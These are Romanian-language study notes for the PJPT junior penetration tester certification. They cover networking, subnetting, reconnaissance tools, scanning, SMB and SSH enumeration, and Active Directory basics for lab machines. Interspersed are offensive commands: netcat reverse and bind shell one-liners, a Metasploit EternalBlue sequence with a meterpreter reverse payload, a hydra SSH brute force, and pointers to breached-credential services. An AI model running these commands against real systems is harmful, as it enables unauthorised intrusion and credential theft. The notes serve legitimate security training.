# PJPT(Practical Junior Penetration Tester)
certificare practică oferită de TCM Security care testează abilitățile de bază în ethical hacking (enumerare, exploatare, privilege escalation și raportare), ideală pentru începători în domeniul pentesting-ului.Durată este 48 ore pentru laborator + 48 ore pentru raport.

## Coursuri recomandate:
1. Practical Ethical Hacking - The complete Course
2. Open-Source Intelligence (OSINT) Fundamentals
3. External Pentest Playbook
4. Windows Privilege Escalation for Beginners
5. Linux Privilege Escalation fot Beginners

## Notekeeping:
- Notion 
- Obsidian 
- Joplin
- GitBook
- CheryTree
- OneNote

### Screenshots Windows:
- GreenShot 
- FlameShot

## Networking Refresher:
- IP addresses
- MAC Addresses 
- TCP, UDP and Three-Way Handshake
- Common Ports and Protocols
- The OSI Model
- Subnetting
---
**IP addresses** - un IP address este identificatorul numeric al unui dispozitiv în rețea (ex.: 192.168.1.10 pentru IPv4). IPv4 = 4 octeți (ex. 203.0.113.5); IPv6 = șir hex (ex. 2001:db8::1).

**MAC Addresses** (Media Access Control Address) - dentificator unic atribuit unei plăci de rețea (NIC). 6 perechi hex (ex. 00:1A:2B:3C:4D:5E). permite identificarea dispozitivelor în rețele Ethernet / Wi-Fi în cadrul aceleiași rețele locale (LAN).

**NAT** - Este deja adresa fizică a dispozitivului sau a interfeții de rețea. Dupa primi 3 octeți putem vedea cine este vendorul pe acest [portal](https://maclookup.app/search/result?mac=00:15:5d).

**TCP, UDP** and **Three-Way Handshake** - (negocierea conexiunii TCP) reprezintă procesul prin care două dispozitive stabilesc o conexiune TCP, în care clientul trimite un mesaj SYN pentru a solicita conexiunea, serverul răspunde cu SYN-ACK pentru a confirma primirea și disponibilitatea, iar clientul trimite înapoi ACK pentru a finaliza stabilirea sesiunii, după care comunicarea poate începe; pe scurt, este mecanismul de inițializare a unei conexiuni fiabile între două sisteme.

- **TCP**(Transmission Control Protocol) -  este un protocol orientat pe conexiune care asigură livrarea garantată și în ordinea corectă a pachetelor, folosind mecanisme de confirmare (ACK) și retransmisie, fiind mai lent dar sigur; este utilizat în protocoale precum HTTP/HTTPS, SSH, FTP, SMTP și Telnet și poate fi descris pe scurt ca un protocol fiabil, controlat și ordonat.
- **UDP**(User Datagram Protocol) - este un protocol fără conexiune care nu garantează livrarea sau ordinea pachetelor și nu folosește mecanisme de confirmare, fiind mult mai rapid, dar mai puțin sigur decât TCP; este utilizat în aplicații unde viteza este mai importantă decât acuratețea, precum DNS, VoIP, streaming audio-video și jocuri online, și poate fi descris pe scurt ca un protocol rapid, simplu și fără garanții.
##### Three-Way handshake
![README-2025-11-10-10-38-34.png](../src/img/README-2025-11-10-10-38-34.png)
Three-Way Handshake este procesul folosit de TCP pentru a stabili o conexiune între două dispozitive. Este o secvență de trei pași care are loc înainte ca transmiterea datelor să poată începe. Iată cum funcționează:

- SYN (Synchronize): Dispozitivul inițiator (numit de obicei client) trimite un pachet TCP cu flag-ul SYN activat către dispozitivul de destinație (numit server). Acest pachet indică intenția de a stabili o conexiune și conține un număr de secvență inițial.
- SYN-ACK (Synchronize-Acknowledge): După ce primește pachetul SYN, dispozitivul de destinație răspunde cu un pachet TCP ce are flag-urile SYN și ACK activate. Acest pachet confirmă primirea cererii și include propriul număr de secvență inițial.
- ACK (Acknowledge): În final, dispozitivul inițiator confirmă pachetul SYN-ACK trimițând înapoi un pachet ACK către destinație. Acest pachet confirmă stabilirea conexiunii și conține, de obicei, numărul de secvență incrementat.

```wireshark filtre
tcp.flags.syn == 1 or tcp.flags.ack == 1
```

![README-2025-11-12-14-25-10.png](../src/img/README-2025-11-12-14-25-10.png)

### Common Ports and Protocols:
| Protocol / Serviciu | Descriere | Port | Tip Transport |
|--------------------|-----------|------|----------------|
| [FTP](Enumerating%20FTP.md) | File Transfer Protocol | 21 | TCP |
| [SSH](Enumerating%20SSH.md) | Secure Shell | 22 | TCP |
| Telnet | Remote Terminal Access | 23 | TCP |
| SMTP | Simple Mail Transfer Protocol | 25 | TCP |
| DNS | Domain Name System | 53 | TCP / UDP |
| [HTTP](Enumerating%20HTTP_HTTPS.md) | Hypertext Transfer Protocol | 80 | TCP |
| [HTTPS](Enumerating%20HTTP_HTTPS.md) | Hypertext Transfer Protocol Secure | 443 | TCP |
| DHCP | Dynamic Host Configuration Protocol | 67 (Server), 68 (Client) | UDP |
| POP3 | Post Office Protocol v3 | 110 | TCP |
| IMAP | Internet Message Access Protocol | 143 | TCP |
| SNMP | Simple Network Management Protocol | 161 | UDP |
| NTP | Network Time Protocol | 123 | UDP |
| [SMB](Enumerating%20SMB.md) | Server Message Block | 445 | TCP |
| TFTP | Trivial File Transfer Protocol | 69 | UDP |
| FTPS | FTP Secure (SSL/TLS) | 990 | TCP |
| LDAP | Lightweight Directory Access Protocol | 389 | TCP / UDP |
| MySQL | MySQL Database Service | 3306 | TCP |
| RDP | Remote Desktop Protocol | 3389 | TCP |

### OSI Model:
Modelul OSI (Open Systems Interconnection)

Modelul OSI este un cadru conceptual care împarte procesul de comunicație în rețea în 7 straturi. Fiecare strat are responsabilități specifice și comunică cu straturile de deasupra și dedesubt. Scopul său este să standardizeze modul în care dispozitivele comunică între ele și să faciliteze proiectarea, înțelegerea și depanarea rețelelor.
| Nr.   | Strat                              | Rol principal                                                                                | Exemple                               |
| ----- | ---------------------------------- | -------------------------------------------------------------------------------------------- | ------------------------------------- |
| **1** | **Physical** *(Fizic)*             | Transmiterea bitilor brut pe mediu (cupru, fibră, radio)                                     | cabluri, semnale, conectori           |
| **2** | **Data Link** *(Legătură de date)* | Asigură transmiterea cadrelor între dispozitive din aceeași rețea locală și detectează erori | **MAC**, **Ethernet**, **Wi-Fi**, PPP |
| **3** | **Network** *(Rețea)*              | Rutarea pachetelor între rețele diferite, adresare logică                                    | **IP**, ICMP, rutare                  |
| **4** | **Transport**                      | Asigură livrarea datelor între gazde finale, control du-te/vino                              | **TCP**, **UDP**                      |
| **5** | **Session** *(Sesiune)*            | Creează, menține și închide sesiunile dintre aplicații                                       | Control comunicare între aplicații    |
| **6** | **Presentation** *(Prezentare)*    | Transformă datele (criptare, compresie, encoding)                                            | SSL/TLS, formate date                 |
| **7** | **Application**                    | Interacțiunea directă cu utilizatorul și aplicațiile                                         | **HTTP**, **FTP**, **SMTP**, **DNS**  |

Metoda de memorizare:
**Please Do Not Throw Sausage Pizza Away** 

#### OSI Schema:
![README-2025-11-10-13-08-54.png](../src/img/README-2025-11-10-13-08-54.png)

## Subnetting:
**Subnetting** - este procesul prin care o rețea IP mare este împărțită în rețele mai mici numite subrețele (subnets).
Scopul este folosirea mai eficientă a adreselor IP și o organizare mai bună a rețelei.

Subnetting se face prin împrumutarea unor biți din partea de host a adresei pentru a crea ID-uri de subnet.

Acesta este fisierul care ne ajuta [exel subnet](../src/docx/Subnet-Guide.xlsx) 

### Subnet x.0.0.0
| CIDR | /1 | /2 | /3 | /4 | /5 | /6 | /7 | /8 |
|------|----|----|----|----|----|----|----|----|
| **Hosts** | 2,147,483,648 | 1,073,741,824 | 536,870,912 | 268,435,456 | 134,217,728 | 67,108,864 | 33,554,432 | 16,777,216 |

---

### Subnet 255.x.0.0
| CIDR | /9 | /10 | /11 | /12 | /13 | /14 | /15 | /16 |
|------|----|-----|-----|-----|-----|-----|-----|-----|
| **Hosts** | 8,388,608 | 4,194,304 | 2,097,152 | 1,048,576 | 524,288 | 262,144 | 131,072 | 65,536 |

---

### Subnet 255.255.x.0
| CIDR | /17 | /18 | /19 | /20 | /21 | /22 | /23 | /24 |
|------|-----|-----|-----|-----|-----|-----|-----|-----|
| **Hosts** | 32,768 | 16,384 | 8,192 | 4,096 | 2,048 | 1,024 | 512 | 256 |

---

### Subnet 255.255.255.x
| CIDR | /25 | /26 | /27 | /28 | /29 | /30 | /31 | /32 |
|------|-----|-----|-----|-----|-----|-----|-----|-----|
| **Hosts** | 128 | 64 | 32 | 16 | 8 | 4 | 2 | 1 |

---

### Subnet Mask Byte Values (Replace x)
| Value | 128 | 192 | 224 | 240 | 248 | 252 | 254 | 255 |
|-------|-----|-----|-----|-----|-----|-----|-----|-----|

---

### Notes:
Număr Subneturi = 2^număr_biți_împrumutați

Host-uri pe subnet = 2^(biți_rămași) - 2
### Exemple:
| Subnet | Rețea            | Interval adrese utilizabile   | Broadcast     |
| ------ | ---------------- | ----------------------------- | ------------- |
| 1      | 192.168.0.0/26   | 192.168.0.1 – 192.168.0.62    | 192.168.0.63  |
| 2      | 192.168.0.64/26  | 192.168.0.65 – 192.168.0.126  | 192.168.0.127 |
| 3      | 192.168.0.128/26 | 192.168.0.129 – 192.168.0.190 | 192.168.0.191 |
| 4      | 192.168.0.192/26 | 192.168.0.193 – 192.168.0.254 | 192.168.0.255 |

## Subneting 2:
Mai multe exemple:
| CIDR            | Mască subnet    | Hosturi utilizabile | Network      | Broadcast     | Interval hosturi            |
| --------------- | --------------- | ------------------- | ------------ | ------------- | --------------------------- |
| 192.168.1.0/24  | 255.255.255.0   | 254                 | 192.168.1.0  | 192.168.1.255 | 192.168.1.1 – 192.168.1.254 |
| 192.168.1.0/28  | 255.255.255.240 | 14                  | 192.168.1.0  | 192.168.1.15  | 192.168.1.1 – 192.168.1.14  |
| 192.168.1.16/28 | 255.255.255.240 | 14                  | 192.168.1.16 | 192.168.1.31  | 192.168.1.17 – 192.168.1.30 |
| 192.168.0.0/23  | 255.255.254.0   | 510                 | 192.168.0.0  | 192.168.1.255 | 192.168.0.1 – 192.168.1.254 |
| 192.168.2.0/23  | 255.255.254.0   | 510                 | 192.168.2.0  | 192.168.3.255 | 192.168.2.1 – 192.168.3.254 |
| 192.168.0.0/22  | 255.255.252.0   | 1022                | 192.168.0.0  | 192.168.3.255 | 192.168.0.1 – 192.168.3.254 |
| 192.168.1.0/26  | 255.255.255.192 | 62                  | 192.168.1.0  | 192.168.1.63  | 192.168.1.1 – 192.168.1.62  |
| 192.168.1.0/27  | 255.255.255.224 | 30                  | 192.168.1.0  | 192.168.1.31  | 192.168.1.1 – 192.168.1.30  |

## Setting Up Our Lab:
Aici putem instala 2 produse de virtualizare VirtualBox/VMware. VMware deja este instalat si configuralt pe sistem de accea accesta o sa fie folosit pentru a ridica laboratoarele. 

## The Five Stages of Ethical Hacking:
Etapele hacking-ului etic

1. Reconnaisance (Colectare informații)
Adună informații pasive despre țintă: site-uri publice, DNS, WHOIS, rețele sociale, arhive. Scop: înțelege infrastructura și identifică posibile puncte de intrare.

2. Scanning (Scanare)
Provoacă activ ținta pentru a descoperi porturi deschise, servicii și vulnerabilități (port-scan, mapping, vulnerability scan). Produce lista de vectori exploatabili.
 
3. Gaining Access (Obținerea accesului)
Folosește vulnerabilitățile găsite pentru a pătrunde (exploits, cracking parole, social engineering). Obiectiv: acces la sistem/conturi pentru a demonstra impactul.

4. Maintaining Access (Menținerea accesului)
Instalează mecanisme de persistență (backdoor, reverse shell, conturi ascunse) pentru a arăta ce ar putea face un atacator real dacă nu e descoperit.

5. Covering Tracks (Acoperirea urmelor)
Șterge sau modifică dovezile activității (loguri, fișiere temporare), restabilește sau ascunde schimbările pentru a evalua detectabilitatea și capacitatea de răspuns.

![README-2025-11-12-14-58-28.png](../src/img/README-2025-11-12-14-58-28.png)

## Information Gathering(Reconnaissance):
### Passive Reconnaissance Overview:
Web/Host:
Target Validation:
- whois
- nslookup
- dnsrecon
Finding Subdomains:
- Google Fu
- dig
- Nmap
- Sublist3r
- Bluto
- crt.sh
Fingerprinting:
- nmap 
- Wappalyzer
- BuiltWith
- Netcat
Data Breaches:
- HavelBeenPwned 
- BreachParse
- WeLeakInfo

### Identifying Our Target:
Bug Bounty:
- Bugcrowd

### Discovering Email Addresses:
Email OSINT:
- hunter.io
- phonebook.cz
- voilanorbert.com
- ClearbitConnect gmail service(need more information)
    - verify email addres https://tools.emailhippo.com/

###  Gathering Breached Credentials with Breach-Parse:
- Tool [breach-parse](https://github.com/hmaverickadams/breach-parse) wordlist-ul are aproape 50GB 

###  Hunting Breached Credentials with DeHashed:
- [DeHashed](https://dehashed.com/) contra plata
- [Hashes](https://hashes.com/en/decrypt/hash) permite sa intoducem un hash si sa vedem in clear text


### Hunting Subdomains Part 1
#### Sublist3r 
tool Python pentru enumera­rea subdomeniilor folosind mai multe surse publice (Google, Yahoo, Bing, PassiveDNS, etc.). Rapid pentru recon și ușor de folosit în linie de comand
```bash
# Install
apt install sublist3r
yay -S sublist3r
# Run 
sublist3r -d tesla.com 
```
#### [crt.sh](https://crt.sh/)
serviciu web (Certificate Transparency search) care caută certificate emise pentru un domeniu; foarte util pentru descoperirea subdomeniilor prin certificatele publicate.
```request
%.tesla.com
```
#### OWASP Amass:
framework avansat pentru enumerarea subdomeniilor și harta de rețea (passive + active + DNS bruteforce + scraping). Potrivit pentru cercetări exhaustive și generare de grafuri.
```bash
yay -S amass        # sau amass-bin dacă preferi binarul precompilat
amass -version
amass enum -d tesla.com
```

### Identifying Website Technologies:
- [BuiltWith](https://builtwith.com/) - serviciu web care detectează tehnologiile folosite de un site (CMS, analytics, biblioteci, hosting, CDN). Bun pentru profiling rapid al unei ținte web.
- Wappalyzer - extensie/bibliotecă care identifică tehnologii web (frameworks, librării, servere, CMS). Are plugin browser și CLI/ API — util pentru audit rapid din browser.
- whatweb (CLI) - scanner CLI care detectează servere, CMS-uri, plugin-uri și metadate din pagini web; mai „agresiv” și customizabil prin pluginuri, util pentru fingerprinting web

### Information Gathering with Burp Suite:
#### Google Fu:
Unele exemple:
```
- "exact phrase"        - o fraza care dorim sa fie gasita exact 
- site:                 - platforma pe care dorim sa gasim informatiea
- -                     - permite sa excludem unele fraze ca nu ne sunt interesante (sau platforme) `site:tesla.com -www`
- filetype:             - ce tip de fisiere dorim sa gasim
...
```
Este un resurs unde sunt strinse metodele de a gasi informatia: https://github.com/cipher387/Advanced-search-operators-list?tab=readme-ov-file#searchengines

Alta resursa pentru **Google FU**: https://tryhackme.com/resources/blog/google-fu

## Scanning & Enumeration:
### Port scans:
Aici o sa avem nevoie de **Kioptrix** in cazul meu o sa fie pe VMware:

Kioptrix Download: https://tcm-sec.com/kioptrix

Sau daca vrem toate versiunele: https://www.vulnhub.com/series/kioptrix,8/

Parcurgerea acestei masine o sa fie descrisa detaliata aici [Kioptrix Walkthrough](/PJPT%20Certificate/Walkthrough%20/Kioptrix_Walkthrough.md) mai departe o sa fie doar unele comenzi/utilite utile.

`netdiscove`        - scanează pasiv sau activ rețeaua specificată (de exemplu 192.168.1.0/24) pentru a identifica dispozitivele conectate și afișează adresele lor IP, MAC și producătorul plăcii de rețea. `-r` - pentru range
```bash
netdiscover -r <IP>/<CIDR>
```

`arp-scan`          - scanează rețeaua locală (broadcast domain) trimițând pachete ARP către toate adresele posibile și afișează lista dispozitivelor active cu IP, MAC și vendor.
```bash
arp-scan -l
```
`nmap`              - un instrument open-source de explorare şi auditare a reţelelor care detectează gazde active, porturi deschise, servicii şi versiuni, identifică sistemul de operare şi permite scripturi pentru flaguri avem fisierul  [nmap cheatsheet](nmap-cheatsheet-19.md):

Cel mai simplu exemplu:
```bash
nmap -T4 -p- -A <IP>
```
Net-discoveru(ARP nivelul L2) cu `nmap`:
```bash
nmap -sn <IP>/<CIDR>
```
### Enumerating HTTP/HTTPS:
`nikto`             - scanner web de vulnerabilități care verifică servere HTTP/HTTPS pentru fișiere/configurații/CGI periculoase și probleme cunoscute.

Exemplu:
```bash
nikto -h http://<IP>
```

`dirbuster`         - tool GUI (Java) pentru brute-forcing de directoare și fișiere pe un server web folosind wordlist-uri; util pentru găsirea resurselor ascunse.

`dirb`              - utilitar CLI simplu pentru bruteforce de directoare/fișiere web folosind liste de cuvinte; afișează răspunsurile HTTP relevante.

`gobuster`          - instrument CLI rapid pentru enumerație de directoare, fișiere sau virtual host-uri; folosește concurență (threading) și este bine optimizat pentru scanări rapide.

`ffuf`              - fast web fuzzer/dir-buster modern, foarte flexibil (parametri, fuzzing de query params, ext, etc.) și eficient pentru găsirea resurselor web.

`dirseach`          - scanner Python pentru directoare/fișiere web, recursiv, suportă extensii multiple şi output detaliat. 

Exemplu:
```bash
dirsearch -u http://192.168.1.24/ -r -x 403 # -r  recursive -x - exlude code 
```

### Enumerating SMB:
Metasploit (exemple de bază):
```bash
msfconsole
search name:ms17_010       
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <IP>
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tua_IP>
exploit
# sau: run
```

Listare share-uri, users, versiuni, politici, ACL-uri.

`smbclient`       - client SMB (listare share-uri, conectare anonimă).
```bash
smbclient -L //<IP> -N                          # -N = fără parolă
smbclient //<IP>/<SHARE> -U username
```
`enum4linux`      - script Perl pentru enumerare SMB/NetBIOS (users, shares, OS, group membership).
```bash
enum4linux -a <IP>
```

### Enumerating SSH:
O simpla conexiune poate sa ne arate banerul(unde poate sa fie versiunea si alta informatie utila) pentru serviciul dat:

Banner grab:
```bash
nc -nv <IP> 22
#sau
telnet <IP> 22 
```
### Researching Potential Vulnerabilities:
In sectiunea data avem 2 instrumente principale pentru a exploata vulnerabilitatile gasite:

[`rapid7`](https://www.rapid7.com/)         - companie şi platformă (ex: Metasploit, InsightVM) care oferă unelte comerciale şi baze de date pentru scanare, exploatare şi gestiunea vulnerabilităţilor.

[`exploit-db`](https://www.exploit-db.com/) - arhivă gratuită cu exploit-uri şi PoC-uri publice; utilă pentru a căuta exploituri existente pentru o vulnerabilitate identificată.

`searchsploit`                              -  

## Scanning with Nessus: 
1. Descarc Nessus de pe site-ul oficial: [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true) 
2. Instalez pachetul (exemplu pentru Debian/Ubuntu .deb): `sudo dpkg -i Nessus_packet_here.deb`
3. Pornesc serviciul Nessus și mă asigur că este activ:
```bash
sudo systemctl enable --now nessusd
sudo systemctl status nessusd
```
4. Deschid interfața web în browser la: https://<IP>:8834/

## Exploitation Basics:
### Reverse Shell vs Bind Shells:
`Reverse Shell`         - este cel mai raspandit tip de shell atunci cănd victima dorește să se conecteze la mașina noastra este un tip simplu de shell.
```bash
Attackbox: nc -lvp 4444
Target:    nc <IP_attack_box> 4444 -e /bin/bash
```

![README-2025-11-12-15-32-00.png](../src/img/README-2025-11-12-15-32-00.png)

`Bind Shell`            - este procesul invers atunci cănd atacatorul se conectează la victimă.
```bash
Attackbox: nc 192.168.1.2 4444
Target:    nc -lvp -e 4444 -e /bin/bash
```

![README-2025-11-12-15-34-06.png](../src/img/README-2025-11-12-15-34-06.png)

### Staged vs Non-Staged Payloads:
Non-Staged:  tot payload-ul este trasmis de odata(poate fii ușor depistat de programele antimalware) nu lucrează mereu de obicei este mai multe date(biți) de transferat.
```bash
- Trimite shellcode-ul exploitului tot dintr-o dată
- Mai mare ca dimensiune și nu funcționează întotdeauna
- Exemplu: windows/meterpreter_reverse_tcp
```

Staged: payload-ul se transmite treptat poate fii mai instabil.
```bash
- Trimite payload-ul în etape
- Poate fi mai puțin stabil
- Exemplu: windows/meterpreter/reverse_tcp
``` 

### Root with Metasploit:
Este procesul este descris in fisierul dat [Kioptrix Walkthrough ](./Walkthrough/Kioptrix_Walkthrough.md)


### Manual Exploitation:
Este procesul este descris in fisierul dat [Kioptrix Walkthrough ](./Walkthrough/Kioptrix_Walkthrough.md)

### Brute force:
În cazul meu o să foloses `hydra`:
```bash
hydra -l root -P <password_list> -t 4 -V ssh://192.168.64.131:22
#metasploit 
search ssh 
```

## New Capstone:
Masinele vulnerabile se pot scoate aici: https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1
Pentesting for n00bs:                    https://www.youtube.com/watch?v=3aASluoJ-iM&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB

#### Walkthrough list:
- [Kioptrix](/PJPT%20Certificate/Walkthrough/Kioptrix_Walkthrough.md) #DONE
- [Blue Windows](/PJPT%20Certificate/Walkthrough/Blue_Walkthrough.md) #DONE
- [Academy](/PJPT%20Certificate/Walkthrough/Academy_Walkthrough.md)     #TODO toate de mai jos
- [Dev](/PJPT%20Certificate/Walkthrough/Dev_Walkthrough.md)
- [Butler](/PJPT%20Certificate/Walkthrough/Butler_Walkthrough.md)
- [Blackpearl](/PJPT%20Certificate/Walkthrough/Blackpearl_Walkthrough.md)

##  Active Directory Overview:
Active Directory:

Serviciu de directoare dezvoltat de Microsoft pentru gestionarea rețelelor de domeniu Windows. stochează informații despre obiecte (computere, utilizatori, imprimante, grupuri etc.). gândește-te la el ca la o carte de telefon pentru mediul Windows.Autentifică utilizatorii folosind bilete Kerberos. Dispozitive non-Windows (de ex. maşini Linux, firewall-uri etc.) pot de asemenea să se autentifice în Active Directory prin RADIUS sau LDAP.Obiectele (users, computers, groups) au atribute care pot fi căutate/gestionate prin LDAP. Kerberos oferă autentificare securizată; dacă vezi Kerberos în loguri, înseamnă că procesul de autentificare e tipic AD. Dacă integrezi echipamente non-Windows, verifică suportul pentru LDAP/RADIUS și mapping-ul atributelor (ex: uid ↔ sAMAccountName).

Pentru inceput trebuie de inteles ca Active Directory permite implementarea si sitemelor non-Windows cu `Kerborius` print `LDAP` sau `Radius`

### Physical Active Directory Components:
- **Data store**                        - conține fișierul NTDS.dit, baza de date principală a Active Directory. Important deoarece păstrează toate informațiile despre utilizatori, grupuri, parole hash-uite, și obiectele din domeniu.
- **Domain Controllers(DC)**            - servere care stochează și gestionează copia bazei AD și procesează autentificările utilizatorilor.
- **Global catalog server**             - server special care conține o copie parțială a tuturor obiectelor din forest; permite căutări rapide între domenii.
- **Read-Only Domain COntroller(RODC)** - versiune de DC care oferă doar citire; utilizat în locații nesigure (nu poți modifica obiectele AD local).
### Logical Active Directory Components: 
- **Partitions**                        - segmente logice din baza de date AD (Schema, Configuration, Domain, Application). separă tipuri diferite de date pentru replicare mai eficientă.
- **Schema**                            - definește structura și atributele obiectelor (ex: user are sAMAccountName, mail, etc.). este ca un "model de date" pentru tot AD-ul.

Schema AD DS
- Definește fiecare tip de obiect care poate fi stocat în director.
- Impune reguli privind crearea și configurarea obiectelor.

| Tip obiect (Object Types)             | Funcţie (Function)                         | Exemple (Examples)                         |
| ------------------------------------- | ------------------------------------------ | ------------------------------------------ |
| **Obiect de clasă (Class Object)**    | Ce obiecte pot fi create în director       | Utilizator (User), Calculator (Computer)   |
| **Obiect atribut (Attribute Object)** | Informații care pot fi atașate unui obiect | Nume afișat (Display name), email, telefon |

- **Domains**                           - unități administrative principale care conțin obiecte (utilizatori, calculatoare, grupuri). fiecare are propria bază de date și politici de securitate. 

| Funcție                                    | Descriere                                                                                          |
| ------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| **Graniță administrativă**                 | Permite aplicarea politicilor (Group Policies) asupra grupurilor de obiecte.                       |
| **Graniță de replicare**                   | Controlează replicarea datelor între controlerele de domeniu (Domain Controllers).                 |
| **Graniță de autentificare și autorizare** | Definește limitele pentru accesul la resurse – determină cine se poate conecta și la ce are acces. |

Exemplu:
contoso.com — un domeniu tipic Active Directory care conține utilizatori, calculatoare și politici specifice companiei.

- **Domain trees**                      - grupuri de domenii conectate printr-o relație ierarhică (parent/child). domeniile din același tree împart același namespace DNS.

| Caracteristică                                   | Descriere                                                                                                                                        |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Spațiu de nume comun (namespace)**             | Domeniile din același arbore împart un namespace continuu cu domeniul părinte (ex: `emea.contoso.com`, `na.contoso.com`).                        |
| **Domenii copil (child domains)**                | Fiecare domeniu poate avea propriile subdomenii.                                                                                                 |
| **Trusturi transitive bidirecționale implicite** | Domeniile din același arbore creează automat relații de încredere bidirecționale (two-way transitive trust), permițând autentificarea între ele. |

Exemplu:
```bash
contoso.com
 ├── emea.contoso.com
 └── na.contoso.com
```
- **Forests**                           - colecții de unul sau mai multe domain trees care împart aceeași schemă și catalog global.

| Caracteristică                            | Descriere                                                                                        |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------ |
| **Schemă comună (Common schema)**         | Toate domeniile din pădure folosesc aceeași definiție a obiectelor (schema AD).                  |
| **Partiție de configurare comună**        | Informațiile de configurare (ex: site-uri, servicii, replicare) sunt partajate între domenii.    |
| **Catalog global comun (Global Catalog)** | Permite căutarea obiectelor din toate domeniile din pădure.                                      |
| **Trusturi implicite între domenii**      | Toate domeniile din pădure au relații de încredere automate, permițând autentificarea între ele. |
| **Grupuri administrative comune**         | Grupurile „Enterprise Admins” și „Schema Admins” sunt comune pentru întreaga pădure.             |

Exemplu vizual:
```bash
🌳 Forest
 ├── contoso.com
 │    ├── emea.contoso.com
 │    └── na.contoso.com
 └── fabrikam.com
      └── eu.fabrikam.com
```
O „forest” reprezintă nivelul cel mai înalt de organizare în Active Directory — toate domeniile și arborii dintr-o pădure împart aceeași schemă, configurare și catalog global, fiind conectate prin trusturi implicite.
- **Sites**                             - grupuri de subneturi IP folosite pentru a controla replicarea AD și autentificarea utilizatorilor local. optimizează traficul de rețea între locații fizice diferite.

- **Organization units (OUs)**          - containere logice pentru organizarea obiectelor (ex: departamente). permit aplicarea de Group Policy și delegarea administrării.

| Funcție                                                  | Descriere                                                                                                 |
| -------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| **Reprezenta organizația într-un mod ierarhic și logic** | Structura ierarhică reflectă departamentele, birourile sau echipele reale din companie.                   |
| **Gestiona colectiv obiectele într-un mod coerent**      | Permite aplicarea acelorași politici asupra unui grup de obiecte similare (ex: toți utilizatorii din IT). |
| **Delega permisiuni de administrare**                    | Administratorii pot acorda drepturi de gestionare doar pentru o anumită unitate organizațională.          |
| **Aplica politici (Group Policies)**                     | Permite aplicarea GPO-urilor doar asupra obiectelor din OU-ul respectiv.                                  |

- **trusts**                            - relații între domenii/forests care permit autentificarea și accesul între ele. gândite ca o „încredere” între două domenii – un user dintr-un domeniu poate accesa resurse în altul.

- **Objects**                           -  Toate aceste obiecte sunt stocate și gestionate în baza de date Active Directory și pot fi organizate în OUs (Organizational Units) pentru o administrare mai eficientă.

Obiecte în Active Directory:
| Obiect                                 | Descriere                                                                                                   |
| -------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **User (Utilizator)**                  | Permite accesul utilizatorului la resursele din rețea.                                                      |
| **InetOrgPerson**                      | Similar cu un cont de utilizator; folosit pentru compatibilitate cu alte servicii de directoare (ex: LDAP). |
| **Contacts (Contacte)**                | Folosit în principal pentru a atribui adrese de e-mail utilizatorilor externi. <br>Nu oferă acces la rețea. |
| **Groups (Grupuri)**                   | Simplifică administrarea controlului de acces prin gruparea utilizatorilor.                                 |
| **Computers (Calculatoare)**           | Permite autentificarea și auditarea accesului calculatoarelor la resurse.                                   |
| **Printers (Imprimante)**              | Facilitează localizarea și conectarea la imprimantele din rețea.                                            |
| **Shared Folders (Foldere partajate)** | Permite utilizatorilor să caute foldere partajate pe baza proprietăților definite.                          |

##  Active Directory Lab Build:
### ISO Necessary:
Link: https://www.microsoft.com/en-us/evalcenter
Instalam rolul de DC + Certificate Authority pe serverul Windows:

`SPN`                          - Service Principal Name; un identificator unic folosit de Kerberos pentru a lega un serviciu (ex: MSSQL, HTTP, CIFS) de un cont din Active Directory. Permite autentificarea Kerberos și poate fi abuzat pentru atacuri precum Kerberoasting dacă e configurat greșit.

Este o comandă Active Directory folosită pentru a adăuga un SPN (Service Principal Name) unui anumit cont de serviciu.
```powershell
setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService
Checking domain DC=MARVEL,DC=local
Registering ServicePrincipalNames for CN=SQL Service,CN=Users,DC=MARVEL,DC=local
        HYDRA-DC/SQLService.MARVEL.local:60111
Updated object
```

Este echivalent cu „arată-mi tot ce are asociat SPN în AD”.
```powershell
setspn -T MARVEL.local -Q */*
Checking domain DC=MARVEL,DC=local
CN=HYDRA-DC,OU=Domain Controllers,DC=MARVEL,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/HYDRA-DC.MARVEL.local
        ldap/HYDRA-DC.MARVEL.local/ForestDnsZones.MARVEL.local
        ldap/HYDRA-DC.MARVEL.local/DomainDnsZones.MARVEL.local
        DNS/HYDRA-DC.MARVEL.local
        GC/HYDRA-DC.MARVEL.local/MARVEL.local
        RestrictedKrbHost/HYDRA-DC.MARVEL.local
        RestrictedKrbHost/HYDRA-DC
        RPC/5e93da09-87ac-40d9-8d99-6af92fe3fe43._msdcs.MARVEL.local
        HOST/HYDRA-DC/MARVEL
        HOST/HYDRA-DC.MARVEL.local/MARVEL
        HOST/HYDRA-DC
        HOST/HYDRA-DC.MARVEL.local
        HOST/HYDRA-DC.MARVEL.local/MARVEL.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/5e93da09-87ac-40d9-8d99-6af92fe3fe43/MARVEL.local
        ldap/HYDRA-DC/MARVEL
        ldap/5e93da09-87ac-40d9-8d99-6af92fe3fe43._msdcs.MARVEL.local
        ldap/HYDRA-DC.MARVEL.local/MARVEL
        ldap/HYDRA-DC
        ldap/HYDRA-DC.MARVEL.local
        ldap/HYDRA-DC.MARVEL.local/MARVEL.local
CN=krbtgt,CN=Users,DC=MARVEL,DC=local
        kadmin/changepw
CN=SQL Service,CN=Users,DC=MARVEL,DC=local
        HYDRA-DC/SQLService.MARVEL.local:60111

Existing SPN found!
```

# Attacking Active Directory: Initial Attack Vectors:
## Initial AD Attack Vectors:
### LLMNR Poisoning Overview:
`LLMR `                         - Protocol de rezolvare a numelor folosit când DNS nu răspunde; vulnerabil la spoofing și folosit de Responder pentru a captura hash-uri NTLM.

`LLMR Poisoning`                - Atac în care atacatorul răspunde fals la cererile LLMNR din rețea, făcând o stație să se autentifice către el; astfel capturează hash-uri NTLM care pot fi apoi crăckate sau folosite pentru relay.

